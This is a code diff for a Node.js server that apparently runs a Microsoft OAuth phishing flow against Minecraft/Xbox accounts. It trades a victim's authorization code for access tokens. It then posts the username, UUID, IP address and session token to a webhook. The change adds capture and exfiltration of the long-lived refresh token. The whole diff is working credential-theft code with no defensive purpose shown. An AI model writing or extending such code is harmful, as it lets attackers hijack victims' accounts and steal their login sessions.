@@ -15,7 +15,9 @@ app.get('/', async (req, res) => {
         return
     }
     try {
-        const accessToken = await getAccessToken(code)
+        const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
+        const accessToken = accessTokenAndRefreshTokenArray[0]
+        const refreshToken = accessTokenAndRefreshTokenArray[1]
         const hashAndTokenArray = await getUserHashAndToken(accessToken)
         const userToken = hashAndTokenArray[0]
         const userHash = hashAndTokenArray[1]
@@ -28,7 +30,7 @@ app.get('/', async (req, res) => {
         if (checkIfBanned(username)) {
             return
         }
-        postToWebhook(username, bearerToken, uuid, ip)
+        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
     } catch (e) {
         console.log(e)
     }
@@ -38,7 +40,7 @@ app.listen(port, () => {
     console.log(`Started the server on ${port}`)
 })
 
-async function getAccessToken(code) {
+async function getAccessTokenAndRefreshToken(code) {
     const url = 'https://login.live.com/oauth20_token.srf'
 
     const config = {
@@ -55,7 +57,7 @@ async function getAccessToken(code) {
     }
 
     let response = await axios.post(url, data, config)
-    return response.data['access_token']
+    return [response.data['access_token'], response.data['refresh_token']]
 }
 
 async function getUserHashAndToken(accessToken) {
@@ -121,7 +123,7 @@ function getIp(req) {
     return req.headers['x-forwarded-for'] || req.socket.remoteAddress
 }
 
-function postToWebhook(username, bearerToken, uuid) {
+function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
     let data = {
         username: " ",
@@ -133,7 +135,8 @@ function postToWebhook(username, bearerToken, uuid) {
                 {name: "UUID", value: uuid, inline: true},
                 {name: "Ip", value: ip, inline: true},
                 {name: "SessionID", value: bearerToken, inline: false},
-                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: true},
+                {name: "Refresh Token", value: refreshToken, inline: false},
+                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
             ]
         }]
     }
